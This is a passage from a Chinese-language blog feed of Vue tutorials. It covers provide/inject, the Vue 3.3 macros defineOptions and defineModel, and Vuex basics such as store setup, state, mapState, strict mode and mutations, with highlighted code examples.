class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="provide-和-inject"><a href="#provide-和-inject" class="headerlink" title="provide 和 inject"></a>provide 和 inject</h2><ol><li>顶层组件通过 provide 函数提供数据（可以是简单数据、ref 对象、函数）</li><li>底层组件通过 inject 函数获取数据和方法</li></ol><p>例如：以下代码实现顶层提供数据给底层，并提供修改数据的方法（底层不能直接修改顶层的数据，可以通过传递方法的方式修改）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 顶层组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> middleCom <span class="keyword">from</span> <span class="string">&#x27;@/components/middleCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; provide, ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">provide</span>(<span class="string">&#x27;count&#x27;</span>, count)</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">provide</span>(<span class="string">&#x27;addCount&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        count.<span class="property">value</span>++</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>顶层数据<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">middleCom</span>&gt;</span><span class="tag">&lt;/<span class="name">middleCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 中层组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> bottomCom <span class="keyword">from</span> <span class="string">&#x27;./bottomCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>中层数据<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bottomCom</span>&gt;</span><span class="tag">&lt;/<span class="name">bottomCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 底层组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; inject &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> num = <span class="title function_">inject</span>(<span class="string">&#x27;count&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> addNum = <span class="title function_">inject</span>(<span class="string">&#x27;addCount&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>底层数据 - &#123;&#123; num &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addNum&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331222514.png" alt="image.png"></p><h1 id="Vue3-3-新特性"><a href="#Vue3-3-新特性" class="headerlink" title="Vue3.3 新特性"></a>Vue3.3 新特性</h1><h2 id="defineOptions"><a href="#defineOptions" class="headerlink" title="defineOptions"></a>defineOptions</h2><p>在以下的代码中，写了两个script标签，一个标签写Composition API代码，一个标签以Options API的方式配置组件名，虽然可以配置组件名，但是这种处理方式很不好</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>: <span class="string">&#x27;ComponentName&#x27;</span> </span></span><br><span class="line"><span class="language-javascript">    &#125; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>Com Component<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以在 Vue 3.3 中新引入了 defineOptions 宏。顾名思义，主要是用来定义 Options API 的选项。可以用 defineOptions 定义任意的选项， props, emits, expose, slots 除外（因为这些可以使用 defineXXX 来做到）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">defineOptions</span>(&#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>: <span class="string">&#x27;ComponentName&#x27;</span> </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ...更多自定义属性</span></span></span><br><span class="line"><span class="language-javascript">    &#125;) </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>Com Component<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="defineModel"><a href="#defineModel" class="headerlink" title="defineModel"></a>defineModel</h2><p>在Vue3中，自定义组件上使用v-model, 相当于传递一个modelValue属性，同时触发 <code>update:modelValue</code> 事件</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331224811.png" alt="image.png"></p><p>不要 props，也不用 emit 直接用defineModel()</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 父组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> bottomCom <span class="keyword">from</span> <span class="string">&#x27;@/components/bottomCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// provide(&#x27;count&#x27;, count)</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// provide(&#x27;addCount&#x27;, () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//   count.value++</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;)</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>顶层数据<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bottomCom</span> <span class="attr">v-model</span>=<span class="string">&quot;count&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bottomCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// import &#123; inject &#125; from &#x27;vue&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// const num = inject(&#x27;count&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// const addNum = inject(&#x27;addCount&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; defineModel &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> modelValue = <span class="title function_">defineModel</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(modelValue);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>底层数据 - &#123;&#123; modelValue &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;modelValue++&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331225317.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-Vuex 基本用法</title>
      <link href="/2024/03/26/Vue-Vuex%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2024/03/26/Vue-Vuex%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vuex-简介"><a href="#Vuex-简介" class="headerlink" title="Vuex 简介"></a>Vuex 简介</h1><p>Vuex 是一个 Vue 的<strong>状态管理工具</strong>，状态就是数据。</p><p>大白话：Vuex 是一个插件，可以帮我们管理 Vue 通用的数据 (多组件共享的数据)。例如：购物车数据 个人信息数</p><p><strong>使用场景</strong>：</p><ul><li>某个状态 在 很多个组件 来使用 (个人信息)</li><li>多个组件 共同维护 一份数据 (购物车)</li></ul><p><strong>优势</strong>：</p><ol><li>共同维护一份数据，数据集中化管理</li><li>响应式变化</li><li>操作简洁（ Vuex 提供了一些辅助函数）</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1683178293366.png" alt="1683178293366.png"></p><h1 id="创建-Vuex-空仓库"><a href="#创建-Vuex-空仓库" class="headerlink" title="创建 Vuex 空仓库"></a>创建 Vuex 空仓库</h1><ol><li>在终端使用指令 <code>yarn add vuex@3</code>或者<code>npm i vuex@3</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn add vuex@3</span><br><span class="line">npm i vuex@3</span><br></pre></td></tr></table></figure><ol start="2"><li>新建 <code>store/index.js</code> 文件放置 vuex</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240326134643.png" alt="image.png"></p><ol start="3"><li>创建仓库 <code>store/index.js</code></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 vue</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 导入 vuex</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">// vuex也是vue的插件, 需要use一下, 进行插件的安装初始化</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建仓库 store</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出仓库</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><ol start="4"><li>在 main.js 中导入挂载到Vue实例上</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">  store</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>测试打印 store</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  created () &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$store</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240326135336.png" alt="image.png"></p><h1 id="State-状态"><a href="#State-状态" class="headerlink" title="State 状态"></a>State 状态</h1><ol><li>提供数据：</li></ol><ul><li>State提供唯一的公共数据源，所有共享的数据都要统一放到Store中的State中存储。</li><li>打开项目中的store.js文件，在state对象中可以添加我们要共享的数据。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;我是标题&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="2"><li>使用数据</li></ol><ul><li>使用 store 访问数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取 store：</span><br><span class="line"> 1.Vue模板中获取 this.$store</span><br><span class="line"> 2.js文件中获取 import 导入 store</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模板中：     &#123;&#123; $store.state.xxx &#125;&#125;</span><br><span class="line">组件逻辑中：  this.$store.state.xxx</span><br><span class="line">JS模块中：   store.state.xxx</span><br></pre></td></tr></table></figure><h2 id="辅助函数-mapState"><a href="#辅助函数-mapState" class="headerlink" title="辅助函数 mapState"></a>辅助函数 mapState</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>第一小组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 直接使用仓库里的变量，相当于this.$store.state.count --&gt;</span></span><br><span class="line">        从Vuex中获取的值：<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;&quot;</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; mapState &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span> <span class="comment">// 导入mapState辅助函数</span></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;Son1Com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    ...<span class="title function_">mapState</span>([<span class="string">&#x27;count&#x27;</span>]) <span class="comment">// 展开运算符映射</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vuex-的单向数据流"><a href="#Vuex-的单向数据流" class="headerlink" title="Vuex 的单向数据流"></a>Vuex 的单向数据流</h1><p>Vuex 同样遵循单向数据流，组件中不能直接修改仓库的数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">handleAdd (n) &#123;</span><br><span class="line">    <span class="comment">// 错误代码(vue默认不会监测，监测需要成本)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">count</span>++</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为浏览器默认不会检测到这个错误，所以很难察觉到错误</p><p><strong>开启</strong>严格模式，<code>strick: true</code>可以将此类错误报告出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="comment">// 开启严格模式</span></span><br><span class="line">  <span class="attr">strict</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;我是标题&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="mutations-对象"><a href="#mutations-对象" class="headerlink" title="mutations 对象"></a>mutations 对象</h1><p>mutations 是 vuex 的一个对象，用来修改 state 数据的，<strong>必须时同步操作</strong></p><p>传递参数：<code>this.$store.commit(&#39;xxx&#39;, 参数)</code></p><ol><li>定义 mutations 对象，对象中存放修改 state 的方法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="comment">// 开启严格模式</span></span><br><span class="line">  <span class="attr">strict</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// state数据，存放共享的数据</span></span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;我是标题&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// mutations对象，存放操作state的方法</span></span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    addCount (state, n) &#123;</span><br><span class="line">      state.<span class="property">count</span> += n</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="2"><li>组件中调用 mutations</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    handleAdd (a) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;addCount&#x27;</span>, a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当有多个参数传递时</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;addCount&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="attr">xxx</span>: </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="用-Vuex-实现-input-双向绑定"><a href="#用-Vuex-实现-input-双向绑定" class="headerlink" title="用 Vuex 实现 input 双向绑定"></a>用 Vuex 实现 input 双向绑定</h2><ol><li>输入框渲染内容 <code>:value=&quot;&quot;</code> </li><li>监听输入的数值 <code>@input=&quot;handleInput&quot;</code></li><li>编写函数调用 mutations</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">:value</span>=<span class="string">&quot;count&quot;</span> @<span class="attr">input</span>=<span class="string">&quot;handleInput&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  ...</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    handleInput (e) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> num = e.<span class="property">target</span>.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;changeCount&#x27;</span>, num)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  ...</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>封装 mutations 处理函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">changeCount (state, newCount) &#123;</span><br><span class="line">  state.<span class="property">count</span> = newCount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 